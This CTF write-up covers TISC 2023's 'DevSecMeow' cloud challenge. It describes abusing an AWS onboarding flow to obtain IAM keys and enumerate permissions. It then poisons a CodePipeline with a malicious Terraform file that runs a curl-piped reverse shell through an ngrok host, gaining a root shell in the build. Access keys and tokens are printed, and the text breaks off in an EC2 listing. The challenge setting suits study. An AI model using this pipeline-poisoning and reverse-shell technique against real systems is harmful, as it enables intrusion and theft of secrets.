---
title: TISC 2023 - (Level 7b) DevSecMeow
date: 2023-10-05 20:00:00 +0800
categories: [ctf]
tags: [cloud]
render_with_liquid: false
image:
    path: /assets/images/tisc2023/tisc2023.jpg
---
## Description

> Palindrome has accidentally exposed one of their onboarding guide! Sneak in as a new developer and exfiltrate any meaningful intelligence on their production system.  
>
>[https://d3mg5a7c6anwbv.cloudfront.net/](https://d3mg5a7c6anwbv.cloudfront.net/)  
>
> Note: Concatenate `flag1` and `flag2` to form the flag for submission.

## Solution

The onboarding guide website is shown below:

![](/assets/images/tisc2023/Pasted image 20231002202731.png)

It looked like the first step was to submit some details via the first link, which pointed to `https://61lxjmt991.execute-api.ap-southeast-1.amazonaws.com/development/generate`. Upon clicking on it, the browser showed 2 different URLs:

![](/assets/images/tisc2023/Pasted image 20231002202815.png)

The `csr` link seemed like a link for a certificate signing request (CSR), whereas the `crt` seemed like a link for a certificate (CRT). However, upon clicking on either links, the browser was met with errors:

`csr` link:  
![](/assets/images/tisc2023/Pasted image 20231002202841.png)

`crt` link:  
![](/assets/images/tisc2023/Pasted image 20231002202851.png)

Returning back to the onboarding guide and scrolling further down, there was also a FAQ section:

![](/assets/images/tisc2023/Pasted image 20231002202746.png)

Hence, I guessed that the `csr` link was likely for uploading a CSR whereas the `crt` link was likely for downloading the signed certificate after the uploaded CSR has been processed by a certificate authority (CA) somewhere.

Searching about these links provided more details as to how they can be used:

> [**Uploading objects with presigned URLs**](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
>
> You may use presigned URLs to allow someone to upload an object to your Amazon S3 bucket. Using a presigned URL will allow an upload without requiring another party to have AWS security credentials or permissions. A presigned URL is limited by the permissions of the user who creates it. That is, if you receive a presigned URL to upload an object, you can upload an object only if the creator of the URL has the necessary permissions to upload that object.
> 
> When someone uses the URL to upload an object, Amazon S3 creates the object in the specified bucket. If an object with the same key that is specified in the presigned URL already exists in the bucket, Amazon S3 replaces the existing object with the uploaded object. After upload, the bucket owner will own the object.

The `csr` link was a presigned URL where a CSR can be uploaded to. A CSR was generated like so:

```bash
$ openssl genrsa -out client.key 2048 
$ openssl req -new -key client.key -out client.csr   
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
```

This created a private key `client.key` and a CSR `client.csr`. The `client.csr` could then be uploaded to the `csr` URL like so:

```bash
$ curl -i --upload-file ./client.csr "https://devsecmeow2023certs.s3.amazonaws.com/1696250041-0b5bce67dd5341e897207f159bd3c37e/client.csr?AWSAccessKeyId=ASIATMLSTF3NZZB7IZOL&Signature=nNEmfksn%2FkRPDoSJHRnl9G3K4c0%3D&x-amz-security-token=IQoJb3JpZ2luX2VjEA0aDmFwLXNvdXRoZWFzdC0xIkgwRgIhAMbpT4mTXSVDOmSd8%2BeuLdaG%2Fp%2F0SXyFkKU%2Fkg2qmSZJAiEArw1z6pbLyylU7k8XYzuQ1TPWgbJqlomdrxnHDfqPexEqkAMIFhAAGgwyMzI3MDU0Mzc0MDMiDI6u0S129d4YDYHiEyrtAnLGsc8RsmhIhjGEl0hSHRuDBtJQ0sIP7D%2B86aiz4ob3UuqhBb4%2BtcvwPBpaYQzopUzVabkjvQsJR5pYoyjvyAVJAGtV3y5kLqIu0hwfgfIlOGduJZ3MGczC6swLAriOntTiqTbSifxPPHZnsqH%2BOhMuj5k%2F79h4JsFTWaMrU4e4kobWjQARkz6QQQs5HjhZ5CkCF8os2nRek1E118C%2BX%2BAo2soSMSS0OJ2kdM9ieNJyEJ2W45Y5xY9ii6%2B2jKqzbuQ75fZFvmW8RqJ4n%2BrD7iKr1CmJjOzRgwAdZ3r4Qx%2BTjfmZn%2FOQaPQoXztm%2BNzI%2BgrFReBmv9Gr2xW9oTMQoy%2F8Zb25AlBj2%2FLnSCSWLlyCRAdQiRs3ROqojVHm%2BXVN4w3uGfN%2BFDcDmbGOVIN%2ByhVvLpmB9j27TWJlcyKCEZ5CAReYn%2F8tcw1DeXXl995UT9kRG3W3WvXiZpZBDhgByZjzFizUfg8LJAzPYJ9QMMfu6qgGOpwBpzW741Y2%2FkK%2FuXBfFRN8IorSI3P8I%2BtPMuQr7gBUH8Cm6ZnlYoHa8lra9KuRR3lx13OpAqmCXtBMiGwi9KcPCilPT3X724BuzLVeet2Jtr%2B9ec7j21HZTd9KcwVT2SLjMN0zcGeFKz%2FV51iG64J6PZjQrkyxwxgoahZq5Vb%2FhaejXwDh%2FI1Huktm93RlNb6btC2%2B8%2B2%2F5%2BTkDArK&Expires=1696250641" 
HTTP/1.1 200 OK
x-amz-id-2: ucLd2Hp94mOUTOTilxT3sGNolcoFlknMkUgcZLAG8op0ldWhOckwiNbB3zehhVa6rceWdUzYXxE=
x-amz-request-id: 198WQ962QG00XQY4
Date: Mon, 02 Oct 2023 12:36:47 GMT
x-amz-server-side-encryption: AES256
ETag: "1afca2356e77e92d9195d3c1349e51bc"
Server: AmazonS3
Content-Length: 0
```

The signed certificate was then downloaded via `crt` URL like so:

```bash
$ curl "https://devsecmeow2023certs.s3.amazonaws.com/1696250041-0b5bce67dd5341e897207f159bd3c37e/client.crt?AWSAccessKeyId=ASIATMLSTF3NZZB7IZOL&Signature=xtLlCxg4yANf6a0pO2QqAHocZXk%3D&x-amz-security-token=IQoJb3JpZ2luX2VjEA0aDmFwLXNvdXRoZWFzdC0xIkgwRgIhAMbpT4mTXSVDOmSd8%2BeuLdaG%2Fp%2F0SXyFkKU%2Fkg2qmSZJAiEArw1z6pbLyylU7k8XYzuQ1TPWgbJqlomdrxnHDfqPexEqkAMIFhAAGgwyMzI3MDU0Mzc0MDMiDI6u0S129d4YDYHiEyrtAnLGsc8RsmhIhjGEl0hSHRuDBtJQ0sIP7D%2B86aiz4ob3UuqhBb4%2BtcvwPBpaYQzopUzVabkjvQsJR5pYoyjvyAVJAGtV3y5kLqIu0hwfgfIlOGduJZ3MGczC6swLAriOntTiqTbSifxPPHZnsqH%2BOhMuj5k%2F79h4JsFTWaMrU4e4kobWjQARkz6QQQs5HjhZ5CkCF8os2nRek1E118C%2BX%2BAo2soSMSS0OJ2kdM9ieNJyEJ2W45Y5xY9ii6%2B2jKqzbuQ75fZFvmW8RqJ4n%2BrD7iKr1CmJjOzRgwAdZ3r4Qx%2BTjfmZn%2FOQaPQoXztm%2BNzI%2BgrFReBmv9Gr2xW9oTMQoy%2F8Zb25AlBj2%2FLnSCSWLlyCRAdQiRs3ROqojVHm%2BXVN4w3uGfN%2BFDcDmbGOVIN%2ByhVvLpmB9j27TWJlcyKCEZ5CAReYn%2F8tcw1DeXXl995UT9kRG3W3WvXiZpZBDhgByZjzFizUfg8LJAzPYJ9QMMfu6qgGOpwBpzW741Y2%2FkK%2FuXBfFRN8IorSI3P8I%2BtPMuQr7gBUH8Cm6ZnlYoHa8lra9KuRR3lx13OpAqmCXtBMiGwi9KcPCilPT3X724BuzLVeet2Jtr%2B9ec7j21HZTd9KcwVT2SLjMN0zcGeFKz%2FV51iG64J6PZjQrkyxwxgoahZq5Vb%2FhaejXwDh%2FI1Huktm93RlNb6btC2%2B8%2B2%2F5%2BTkDArK&Expires=1696250641" -o client.crt 
```

Here were the details of the signed certificate:

```bash
$ openssl x509 -in client.crt -text -noout     
Certificate:
    Data:
        Version: 1 (0x0)
        Serial Number:
            f4:c1:52:5e:fd:fb:31:8a
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN = devsecmeow-staging
        Validity
            Not Before: Oct  2 12:36:48 2023 GMT
            Not After : Nov  1 12:36:48 2023 GMT
        Subject: C = AU, ST = Some-State, O = Internet Widgits Pty Ltd
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:be:20:4e:38:f7:25:65:f5:b8:5d:02:b5:c7:53:
                    bc:b2:dd:cc:57:1a:7d:be:2b:52:d4:e5:84:30:2b:
                    4b:1c:e8:60:30:5d:51:56:68:83:31:09:e7:d8:d5:
                    51:f2:af:1e:9b:71:d8:0d:4e:f2:d3:a3:d1:b2:73:
                    d2:2a:4d:d9:d5:7d:3c:75:50:0c:9e:22:59:15:30:
                    25:72:23:3b:6e:15:3e:35:ee:3f:04:ce:f7:08:67:
                    67:63:73:f4:af:58:d3:04:56:e6:b3:4d:2c:51:e0:
                    12:af:f6:e9:e2:b4:8d:46:dc:94:a3:8e:98:ac:c5:
                    4a:15:e5:da:88:e3:c1:bd:32:75:da:44:1d:0a:2e:
                    09:a2:05:08:9d:c5:d3:de:1c:81:ba:67:41:3a:08:
                    46:38:4e:43:87:9f:24:e5:3c:9e:c4:81:00:66:52:
                    f4:b4:fb:32:a4:c2:3d:a9:a7:08:8e:52:67:0d:2b:
                    a5:f9:10:05:7f:76:eb:d3:1b:b9:a1:15:69:2c:f4:
                    86:ee:73:2c:74:43:c4:bd:98:cb:cf:7a:1d:fa:86:
                    39:a0:b5:f4:dc:07:64:2f:0b:3c:f9:19:c3:d1:f2:
                    24:62:2b:f8:e6:2f:9a:27:e6:6d:cf:6c:dd:4e:db:
                    83:39:66:78:3d:f7:64:cc:f3:46:17:d5:1e:f7:6e:
                    67:45
                Exponent: 65537 (0x10001)
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        15:ba:65:52:9b:5b:14:bc:d4:a1:ac:27:0c:30:cb:8f:84:bc:
        61:9f:ce:d0:7b:e1:cb:6d:22:b1:b9:a1:9b:95:c9:ea:f7:fd:
        7d:aa:6b:c1:bd:bc:3b:c1:f9:1b:2a:5b:35:60:a4:40:55:44:
        0e:9f:61:31:27:d6:d2:5b:b5:2f:79:ef:ea:ed:67:68:c4:32:
        40:cc:ce:c9:24:f2:9c:22:4a:4f:ee:7d:a6:0f:1d:0c:8d:8e:
        17:b2:1e:6f:48:63:ee:9c:98:1b:c7:48:6b:f2:bc:2d:ab:b0:
        b8:ba:9c:0d:02:49:e9:40:fd:50:51:c6:66:18:a1:e3:a9:cc:
        b7:d6:75:d2:7e:47:62:7f:85:ea:a4:51:ab:64:ee:18:2d:61:
        48:f9:06:6d:c3:6c:6c:85:e6:5b:a2:8e:df:dc:a4:10:d4:ab:
        63:fe:eb:5e:42:1c:6c:70:f0:c2:d9:82:6e:d8:2a:bd:30:84:
        89:93:6b:9d:0b:3f:e0:10:50:2e:fd:18:f1:25:82:87:77:ca:
        da:7f:bb:52:1e:c1:73:d7:47:c3:e3:d6:51:31:73:35:ac:5c:
        4b:14:c2:3a:8a:9a:5b:44:91:5f:67:08:e0:46:68:52:33:1b:
        21:38:f8:3f:cc:8e:42:23:ac:fe:04:04:43:54:03:7e:c0:14:
        0a:ff:77:cc
```

On inspection, we see that the certificate was issued by `devsecmeow-staging`. 

The next step would be to generate temporary credentials using the link `https://13.213.29.24/`. However, the browser was met with a 403 forbidden:

![](/assets/images/tisc2023/Pasted image 20231002202905.png)

The onboarding guide mentioned something about mTLS, which stood for Mutual TLS. This meant that a particular set of certificates and private keys were necessary to communicate with this web server. Checking the certificate presented by this web server:

![](/assets/images/tisc2023/Pasted image 20231002203909.png)

Seeing that the issuer was also `devsecmeow-staging`, hence there was a high chance that the signed certificate generated earlier would work. Now, to generate the temporary credentials:

```bash
$ curl -k --cert ./client.crt --key client.key https://13.213.29.24/    
{"Message": "Hello new agent, use the credentials wisely! It should be live for the next 120 minutes! Our antivirus will wipe them out and the associated resources after the expected time usage.", "Access_Key": "AKIATMLSTF3N6SIFPQ65", "Secret_Key": "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"} 
```

The access key and secret key were then loaded into the shell like so:

```bash
$ aws configure 
AWS Access Key ID [None]: AKIATMLSTF3N6SIFPQ65
AWS Secret Access Key [None]: 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
Default region name [None]: ap-southeast-1
Default output format [None]: json
```

Checking to see if the credentials were loaded correctly and valid:

```bash
$ aws sts get-caller-identity
{
    "UserId": "AIDATMLSTF3NV253MOQVA",
    "Account": "232705437403",
    "Arn": "arn:aws:iam::232705437403:user/agent-3af8b74b5a024b3095e0ca0b060cdc0e"
}
```

It seemed that the temporary credentials belong to that of `agent-3af8b74b5a024b3095e0ca0b060cdc0e`. To see what this account can do:

```bash
$ aws iam list-attached-user-policies --user-name agent-3af8b74b5a024b3095e0ca0b060cdc0e
{
    "AttachedPolicies": [
        {
            "PolicyName": "agent-3af8b74b5a024b3095e0ca0b060cdc0e",
            "PolicyArn": "arn:aws:iam::232705437403:policy/agent-3af8b74b5a024b3095e0ca0b060cdc0e"
        }
    ]
}
$ aws iam get-policy-version --version-id v1 --policy-arn arn:aws:iam::232705437403:policy/agent-3af8b74b5a024b3095e0ca0b060cdc0e    
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicy",
                        "ssm:DescribeParameters",
                        "iam:GetPolicyVersion",
                        "iam:List*Policies",
                        "iam:Get*Policy",
                        "kms:ListKeys",
                        "events:ListRules",
                        "events:DescribeRule",
                        "kms:GetKeyPolicy",
                        "codepipeline:ListPipelines",
                        "codebuild:ListProjects",
                        "iam:ListRoles",
                        "codebuild:BatchGetProjects"
                    ],
                    "Resource": "*"
                },
                {
                    "Sid": "VisualEditor2",
                    "Effect": "Allow",
                    "Action": [
                        "iam:ListAttachedUserPolicies"
                    ],
                    "Resource": "arn:aws:iam::232705437403:user/${aws:username}"
                },
                {
                    "Sid": "VisualEditor3",
                    "Effect": "Allow",
                    "Action": [
                        "codepipeline:GetPipeline"
                    ],
                    "Resource": "arn:aws:codepipeline:ap-southeast-1:232705437403:devsecmeow-pipeline"
                },
                {
                    "Sid": "VisualEditor4",
                    "Effect": "Allow",
                    "Action": [
                        "s3:PutObject"
                    ],
                    "Resource": "arn:aws:s3:::devsecmeow2023zip/*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2023-10-02T12:39:58+00:00"
    }
}
```

The first thing I checked was `devsecmeow-pipeline`, which the account had `GetPipeline` permissions to. This was done like so:

```bash
$ aws codepipeline get-pipeline --name devsecmeow-pipeline
{
    "pipeline": {
        "name": "devsecmeow-pipeline",
        "roleArn": "arn:aws:iam::232705437403:role/codepipeline-role",
        "artifactStore": {
            "type": "S3",
            "location": "devsecmeow2023zip"
        },
        "stages": [
            {
                "name": "Source",
                "actions": [
                    {
                        "name": "Source",
                        "actionTypeId": {
                            "category": "Source",
                            "owner": "AWS",
                            "provider": "S3",
                            "version": "1"
                        },
                        "runOrder": 1,
                        "configuration": {
                            "PollForSourceChanges": "false",
                            "S3Bucket": "devsecmeow2023zip",
                            "S3ObjectKey": "rawr.zip"
                        },
                        "outputArtifacts": [
                            {
                                "name": "source_output"
                            }
                        ],
                        "inputArtifacts": []
                    }
                ]
            },
            {
                "name": "Build",
                "actions": [
                    {
                        "name": "TerraformPlan",
                        "actionTypeId": {
                            "category": "Build",
                            "owner": "AWS",
                            "provider": "CodeBuild",
                            "version": "1"
                        },
                        "runOrder": 1,
                        "configuration": {
                            "ProjectName": "devsecmeow-build"
                        },
                        "outputArtifacts": [
                            {
                                "name": "build_output"
                            }
                        ],
                        "inputArtifacts": [
                            {
                                "name": "source_output"
                            }
                        ]
                    }
                ]
            },
            {
                "name": "Approval",
                "actions": [
                    {
                        "name": "Approval",
                        "actionTypeId": {
                            "category": "Approval",
                            "owner": "AWS",
                            "provider": "Manual",
                            "version": "1"
                        },
                        "runOrder": 1,
                        "configuration": {},
                        "outputArtifacts": [],
                        "inputArtifacts": []
                    }
                ]
            }
        ],
        "version": 1
    },
    "metadata": {
        "pipelineArn": "arn:aws:codepipeline:ap-southeast-1:232705437403:devsecmeow-pipeline",
        "created": "2023-07-21T23:05:14.065000+08:00",
        "updated": "2023-07-21T23:05:14.065000+08:00"
    }
}
```

In AWS, CodePipeline is used to automate the building and releasing of software as part of the continuous delivery process. For this pipeline, it does the following:
1. Monitors for new changes to a file called `rawr.zip` that is stored in a S3 bucket called `devsecmeow2023zip`.
2. Kickstarts the build process according to the `devsecmeow-build` CodeBuild project.

More details about the `devsecmeow-build` CodeBuild project was shown like so:

```bash
$ aws codebuild batch-get-projects --names devsecmeow-build          
{
    "projects": [
        {
            "name": "devsecmeow-build",
            "arn": "arn:aws:codebuild:ap-southeast-1:232705437403:project/devsecmeow-build",
            "source": {
                "type": "CODEPIPELINE",
                "buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n      - env\n      - cd /usr/bin\n      - curl -s -qL -o terraform.zip https://releases.hashicorp.com/terraform/1.4.6/terraform_1.4.6_linux_amd64.zip\n      - unzip -o terraform.zip\n      - cd \"$CODEBUILD_SRC_DIR\"\n      - ls -la \n      - terraform init \n      - terraform plan\n",
                "insecureSsl": false
            },
            "artifacts": {
                "type": "CODEPIPELINE",
                "name": "devsecmeow-build",
                "packaging": "NONE",
                "overrideArtifactName": false,
                "encryptionDisabled": false
            },
            "cache": {
                "type": "NO_CACHE"
            },
            "environment": {
                "type": "LINUX_CONTAINER",
                "image": "aws/codebuild/amazonlinux2-x86_64-standard:5.0",
                "computeType": "BUILD_GENERAL1_SMALL",
                "environmentVariables": [
                    {
                        "name": "flag1",
                        "value": "/devsecmeow/build/password",
                        "type": "PARAMETER_STORE"
                    }
                ],
                "privilegedMode": false,
                "imagePullCredentialsType": "CODEBUILD"
            },
            "serviceRole": "arn:aws:iam::232705437403:role/codebuild-role",
            "timeoutInMinutes": 15,
            "queuedTimeoutInMinutes": 480,
            "encryptionKey": "arn:aws:kms:ap-southeast-1:232705437403:alias/aws/s3",
            "tags": [],
            "created": "2023-07-21T23:05:13.010000+08:00",
            "lastModified": "2023-07-21T23:05:13.010000+08:00",
            "badge": {
                "badgeEnabled": false
            },
            "logsConfig": {
                "cloudWatchLogs": {
                    "status": "ENABLED",
                    "groupName": "devsecmeow-codebuild-logs",
                    "streamName": "log-stream"
                },
                "s3Logs": {
                    "status": "DISABLED",
                    "encryptionDisabled": false
                }
            },
            "projectVisibility": "PRIVATE"
        }
    ],
    "projectsNotFound": []
}
```

Here are the information that are worth noting:
1. `buildspec`: this describes the workflow of this Codebuild
    ```yml
    version: 0.2

    phases:
    build:
        commands:
        - env
        - cd /usr/bin
        - curl -s -qL -o terraform.zip https://releases.hashicorp.com/terraform/1.4.6/terraform_1.4.6_linux_amd64.zip
        - unzip -o terraform.zip
        - cd \"$CODEBUILD_SRC_DIR\"
        - ls -la 
        - terraform init 
        - terraform plan
    ```

2. `environmentVariables`: this describes the environment variables injected into the build. 
    ```json
    {
        "name": "flag1",
        "value": "/devsecmeow/build/password",
        "type": "PARAMETER_STORE"
    }
    ```

3. `serviceRole`: this states what permissions are given to this build

    ```bash
    $ aws iam list-role-policies --role-name codebuild-role 
    {
        "PolicyNames": [
            "policy_code_build"
        ]
    }
    $ aws iam get-role-policy --role-name codebuild-role --policy-name policy_code_build
    {
        "RoleName": "codebuild-role",
        "PolicyName": "policy_code_build",
        "PolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "logs:PutLogEvents",
                        "logs:CreateLogStream",
                        "logs:CreateLogGroup"
                    ],
                    "Effect": "Allow",
                    "Resource": [
                        "arn:aws:logs:ap-southeast-1:232705437403:log-group:devsecmeow-codebuild-logs:log-stream:*",
                        "arn:aws:logs:ap-southeast-1:232705437403:log-group:devsecmeow-codebuild-logs/*",
                        "arn:aws:logs:ap-southeast-1:232705437403:log-group:devsecmeow-codebuild-logs"
                    ]
                },
                {
                    "Action": [
                        "kms:ReEncrypt*",
                        "kms:GenerateDataKey*",
                        "kms:Encrypt",
                        "kms:DescribeKey",
                        "kms:Decrypt"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:kms:ap-southeast-1:232705437403:key/6b677475-cc95-4f85-8baa-2f30290cde9d"
                },
                {
                    "Action": "ssm:GetParameters",
                    "Effect": "Allow",
                    "Resource": "arn:aws:ssm:ap-southeast-1:232705437403:parameter/devsecmeow/build/password"
                },
                {
                    "Action": "ec2:DescribeInstance*",
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "s3:PutObject",
                        "s3:GetObjectVersion",
                        "s3:GetObject",
                        "s3:GetBucketLocation",
                        "s3:GetBucketAcl"
                    ],
                    "Effect": "Allow",
                    "Resource": [
                        "arn:aws:s3:::devsecmeow2023zip/devsecmeow-pipeline/*",
                        "arn:aws:s3:::devsecmeow2023zip"
                    ]
                }
            ]
        }
    }
    ```

Based on these details, getting a shell on the build was paramount as doing so would have allowed for the access to the first part of the flag (which can be read via the environment variables) and access to the `codebuild-role` role (which had the `ec2:DescribeInstance*` permissions).

Based on the `buildspec` earlier, it performs a `terraform init`. Hence, the first step would be to create a malicious Terraform file that would spawn a reverse shell when the `terraform init` command is executed. (See https://cloud.hacktricks.xyz/pentesting-ci-cd/terraform-security#terraform-plan)

A listener was created like so:

```bash
$ nc -lvnp 1337             
listening on [any] 1337 ...
```

And the listener was made publicly reachable using `ngrok`:

```bash
$ ngrok tcp 1337
Session Status                online                   
Account                       YYYY (Plan: Free)      
Version                       3.3.5                 
Region                        Asia Pacific (ap)     
Latency                       6ms                 
Web Interface                 http://127.0.0.1:4040  
Forwarding                    tcp://0.tcp.ap.ngrok.io:XXXX -> localhost:1337
```

Using the hostname and port number provided by `ngrok`, the following Terraform file was created:

`pwn.tf`:
```hcl
data "external" "example" {
  program = ["sh", "-c", "curl https://reverse-shell.sh/0.tcp.ap.ngrok.io:XXXX | sh"]
}
```

With the malicious Terraform file created, the next step would be to upload it as `rawr.zip` to the `devsecmeow2023zip` bucket. Fortunately, the current account has `PutObject` permissions to the `devsecmeow2023zip` bucket.

The `pwn.tf` was zipped up as `rawr.zip` like so:

```bash
$ zip rawr.zip pwn.tf 
  adding: pwn.tf (deflated 8%)
```

And the `rawr.zip` was uploaded to the `devsecmeow2023zip` bucket:

```bash
$ aws s3 cp ./rawr.zip s3://devsecmeow2023zip/rawr.zip
upload: ./rawr.zip to s3://devsecmeow2023zip/rawr.zip 
```

After a while, a reverse shell connection was caught on the listener:

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 35634
sh: cannot set terminal process group (1): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.2# id
id
uid=0(root) gid=0(root) groups=0(root)
```

Since the first part of the flag was injected into the environment variables, it was obtained by using the `env` command:

```bash
sh-5.2# env
env
...
flag1=TISC{pr0tecT_
...
```

> `flag1` is `TISC{pr0tecT_`.

Normally the next step would be to reach out to the AWS metadata URL and generate temporary credentials, but since the reverse shell session was rather stable, it would be used to enumerate further.

Since the `codebuild-role` has the  `ec2:DescribeInstance*` rights, the `DescribeInstances` action can be used to list all existing EC2 virtual machines:

```bash
sh-5.2# aws ec2 describe-instances
aws ec2 describe-instances
{
    "Reservations": [
        {
            "Groups": [],
            "Instances": [
                {
                    "AmiLaunchIndex": 0,
                    "ImageId": "ami-0df7a207adb9748c7",
                    "InstanceId": "i-02602bf0cf92a4ee1",
                    "InstanceType": "t3a.small",
                    "LaunchTime": "2023-07-31T14:50:12+00:00",
                    "Monitoring": {
                        "State": "disabled"
                    },
                    "Placement": {
                        "AvailabilityZone": "ap-southeast-1a",
                        "GroupName": "",
                        "Tenancy": "default"
                    },
                    "PrivateDnsName": "ip-192-168-0-112.ap-southeast-1.compute.internal",
                    "PrivateIpAddress": "192.168.0.112",
                    "ProductCodes": [],
                    "PublicDnsName": "ec2-54-255-155-134.ap-southeast-1.compute.amazonaws.com",
                    "PublicIpAddress": "54.255.155.134",
                    "State": {
                        "Code": 16,
                        "Name": "running"
                    },
                    "StateTransitionReason": "",
                    "SubnetId": "subnet-0e7baa8cdf3a7fd1b",
                    "VpcId": "vpc-063e577d022d3fa3b",
                    "Architecture": "x86_64",
                    "BlockDeviceMappings": [
                        {
                            "DeviceName": "/dev/sda1",
                            "Ebs": {
                                "AttachTime": "2023-07-21T15:05:29+00:00",
                                "DeleteOnTermination": true,
                                "Status": "attached",
                                "VolumeId": "vol-059ce4b405612f51a"
                            }
                        }
                    ],
                    "ClientToken": "terraform-20230721150528288200000009",
                    "EbsOptimized": false,
                    "EnaSupport": true,
                    "Hypervisor": "xen",
                    "IamInstanceProfile": {
                        "Arn": "arn:aws:iam::232705437403:instance-profile/ec2_production",
                        "Id": "AIPATMLSTF3N6TTIJTATG"
                    },
                    "NetworkInterfaces": [
                        {
                            "Association": {
                                "IpOwnerId": "amazon",
                                "PublicDnsName": "ec2-54-255-155-134.ap-southeast-1.compute.amazonaws.com",
                                "PublicIp": "54.255.155.134"
                            },
                            "Attachment": {
                                "AttachTime": "2023-07-21T15:05:29+00:00",
                                "AttachmentId": "eni-attach-0f142ca01d9f74be8",
                                "DeleteOnTermination": true,
                                "DeviceIndex": 0,
                                "Status": "attached",
                                "NetworkCardIndex": 0
                            },
                            "Description": "",
                            "Groups": [
                                {
                                    "GroupName": "Generic network for staging and production",
                                    "GroupId": "sg-0c178b9e55483a8da"
                                }
                            ],
                            "Ipv6Addresses": [],
                            "MacAddress": "02:83:9e:48:11:60",
                            "NetworkInterfaceId": "eni-049d23f49ac0d3c2c",
                            "OwnerId": "232705437403",
                            "PrivateDnsName": "ip-192-168-0-112.ap-southeast-1.compute.internal",
                            "PrivateIpAddress": "192.168.0.112",
                            "PrivateIpAddresses": [
                                {
                                    "Association": {
                                        "IpOwnerId": "amazon",
                                        "PublicDnsName": "ec2-54-255-155-134.ap-southeast-1.compute.amazonaws.com",
                                        "PublicIp": "54.255.155.134"
                                    },
                                    "Primary": true,
                                    "PrivateDnsName": "ip-192-168-0-112.ap-southeast-1.compute.internal",
                                    "PrivateIpAddress": "192.168.0.112"
                                }
                            ],
                            "SourceDestCheck": true,
                            "Status": "in-use",
                            "SubnetId": "subnet-0e7baa8cdf3a7fd1b",
                            "VpcId": "vpc-063e577d022d3fa3b",
                            "InterfaceType": "interface"
                        }
                    ],
                    "RootDeviceName": "/dev/sda1",
                    "RootDeviceType": "ebs",
                    "SecurityGroups": [
                        {
                            "GroupName": "Generic network for staging and production",
                            "GroupId": "sg-0c178b9e55483a8da"
                        }
                    ],
                    "SourceDestCheck": true,
                    "VirtualizationType": "hvm",
                    "CpuOptions": {
                        "CoreCount": 1,
                        "ThreadsPerCore": 2
                    },
                    "CapacityReservationSpecification": {
                        "CapacityReservationPreference": "open"
                    },
                    "HibernationOptions": {
                        "Configured": false
                    },
                    "MetadataOptions": {
                        "State": "applied",
                        "HttpTokens": "optional",
                        "HttpPutResponseHopLimit": 1,
                        "HttpEndpoint": "enabled",
                        "HttpProtocolIpv6": "disabled",
                        "InstanceMetadataTags": "disabled"
                    },
                    "EnclaveOptions": {
                        "Enabled": false
                    },
                    "PlatformDetails": "Linux/UNIX",
                    "UsageOperation": "RunInstances",
                    "UsageOperationUpdateTime": "2023-07-21T15:05:29+00:00",
                    "PrivateDnsNameOptions": {
                        "HostnameType": "ip-name",
                        "EnableResourceNameDnsARecord": false,
                        "EnableResourceNameDnsAAAARecord": false
                    },
                    "MaintenanceOptions": {
                        "AutoRecovery": "default"
                    },
                    "CurrentInstanceBootMode": "legacy-bios"
                }
            ],
            "OwnerId": "232705437403",
            "ReservationId": "r-076f2078341159d89"
        },
        {
            "Groups": [],
            "Instances": [
                {
                    "AmiLaunchIndex": 0,
                    "ImageId": "ami-0df7a207adb9748c7",
                    "InstanceId": "i-02423bae26b4cfd9a",
                    "InstanceType": "t3a.small",
                    "LaunchTime": "2023-09-16T07:06:20+00:00",
                    "Monitoring": {
                        "State": "disabled"
                    },
                    "Placement": {
                        "AvailabilityZone": "ap-southeast-1a",
                        "GroupName": "",
                        "Tenancy": "default"
                    },
                    "PrivateDnsName": "ip-192-168-0-172.ap-southeast-1.compute.internal",
                    "PrivateIpAddress": "192.168.0.172",
                    "ProductCodes": [],
                    "PublicDnsName": "ec2-13-213-29-24.ap-southeast-1.compute.amazonaws.com",
                    "PublicIpAddress": "13.213.29.24",
                    "State": {
                        "Code": 16,
                        "Name": "running"
                    },
                    "StateTransitionReason": "",
                    "SubnetId": "subnet-0e7baa8cdf3a7fd1b",
                    "VpcId": "vpc-063e577d022d3fa3b",
                    "Architecture": "x86_64",
                    "BlockDeviceMappings": [
                        {
                            "DeviceName": "/dev/sda1",
                            "Ebs": {
                                "AttachTime": "2023-09-16T07:06:20+00:00",
                                "DeleteOnTermination": true,
                                "Status": "attached",
                                "VolumeId": "vol-0429e09162524aa33"
                            }
                        }
                    ],
                    "ClientToken": "terraform-20230916070619552900000001",
                    "EbsOptimized": false,
                    "EnaSupport": true,
                    "Hypervisor": "xen",
                    "NetworkInterfaces": [
                        {
                            "Association": {
                                "IpOwnerId": "amazon",
                                "PublicDnsName": "ec2-13-213-29-24.ap-southeast-1.compute.amazonaws.com",
                                "PublicIp": "13.213.29.24"
                            },
                            "Attachment": {
                                "AttachTime": "2023-09-16T07:06:20+00:00",
                                "AttachmentId": "eni-attach-01bc5e45e2c2c672f",
                                "DeleteOnTermination": true,
                                "DeviceIndex": 0,
                                "Status": "attached",
                                "NetworkCardIndex": 0
                            },
                            "Description": "",
                            "Groups": [
                                {
                                    "GroupName": "Generic network for staging and production",
                                    "GroupId": "sg-0c178b9e55483a8da"
                                }
                            ],
                            "Ipv6Addresses": [],
